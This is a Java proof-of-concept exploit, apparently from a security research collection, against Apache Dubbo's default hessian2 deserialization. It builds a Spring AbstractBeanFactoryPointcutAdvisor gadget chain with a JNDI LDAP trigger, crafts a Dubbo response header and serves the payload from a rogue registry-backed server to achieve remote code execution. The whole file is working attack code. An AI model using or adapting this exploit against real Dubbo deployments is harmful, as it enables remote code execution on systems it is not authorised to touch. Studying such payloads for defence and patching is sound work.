package com.threedr3am.bug.dubbo.rouge.hessian2;

import com.caucho.hessian.io.Hessian2Output;
import com.threedr3am.bug.dubbo.rouge.RougeBase;
import com.threedr3am.bug.common.server.LdapServer;
import com.threedr3am.bug.dubbo.support.NoWriteReplaceSerializerFactory;
import com.threedr3am.bug.dubbo.utils.SpringUtil;
import java.io.ByteArrayOutputStream;
import java.util.Random;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.springframework.beans.factory.BeanFactory;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE
 *
 * Spring环境可打，暂时测试Spring-boot打不了（应该是AOP相关类的问题）
 *
 * <dependency>
 *   <groupId>org.springframework</groupId>
 *   <artifactId>spring-aop</artifactId>
 *   <version>${spring.version}</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class SpringAbstractBeanFactoryPointcutAdvisorPoc extends RougeBase {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws Exception {
    BeanFactory bf = SpringUtil.makeJNDITrigger("ldap://127.0.0.1:43658/Calc");
    Object o = SpringUtil.makeBeanFactoryTriggerBFPA("ldap://127.0.0.1:43658/Calc", bf);

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    // header.
    byte[] header = new byte[16];
    // set magic number.
    Bytes.short2bytes((short) 0xdabb, header);
    // set response event and serialization flag.
    header[2] = (byte) ((byte) 0x20 | 2);
    header[3] = 20;

    // set response id.
    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

    ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
    Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
    NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
    sf.setAllowNonSerializable(true);
    out.setSerializerFactory(sf);


    out.writeObject(o);
    out.flushBuffer();
    if (out instanceof Cleanable) {
      ((Cleanable) out).cleanup();
    }

    Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
    byteArrayOutputStream.write(header);
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

    byte[] bytes = byteArrayOutputStream.toByteArray();

    String zookeeperUri = "127.0.0.1:2181";
    String rougeHost = "127.0.0.1";
    int rougePort = 33334;

    new SpringAbstractBeanFactoryPointcutAdvisorPoc().startRougeServer(zookeeperUri, rougeHost, rougePort, bytes,
        true);
  }

  @Override
  public String getType() {
    return "hessian2";
  }

}
